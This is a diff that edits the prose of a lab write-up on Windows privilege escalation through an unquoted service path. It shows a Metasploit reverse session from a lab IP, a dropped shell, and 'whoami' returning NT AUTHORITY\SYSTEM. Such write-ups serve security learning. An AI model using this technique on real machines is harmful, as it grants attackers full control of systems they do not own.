@@ -334,7 +334,9 @@ When the service started, Windows looked for the executable in the unquoted path
 
 ## Step 5 — Getting a SYSTEM Shell
 
-Metasploit Caught the Connection
+### Metasploit Caught the Connection
+
+After I started the service, my payload connected back to the Metasploit listener and opened a new Meterpreter session.
 
 ```
 [*] Sending stage (244806 bytes) to 192.168.5.144
@@ -346,7 +348,7 @@ meterpreter >
   <img src="images/step5-1.png" width="600">
 </p>
 
-Dropped into a Shell and Checked Privileges
+Next, I dropped into a Windows command shell from the Meterpreter session.
 
 ```bash
 meterpreter > shell
@@ -363,6 +365,8 @@ Microsoft Windows [Version 10.0.19045.2965]
   <img src="images/step5-2.png" width="600">
 </p>
 
+To confirm my privileges, I ran:
+
 ```bash
 C:\PrivEsc>whoami
 ```
@@ -376,4 +380,4 @@ nt authority\system
   <img src="images/step5-3.png" width="600">
 </p>
 
-I went from a normal low privilege user to `nt authority\system` just by dropping a file into a writable folder and starting a service.
+The output confirmed that I was running as `NT AUTHORITY\SYSTEM`, which is the highest privilege level on a Windows machine. The attack was successful.
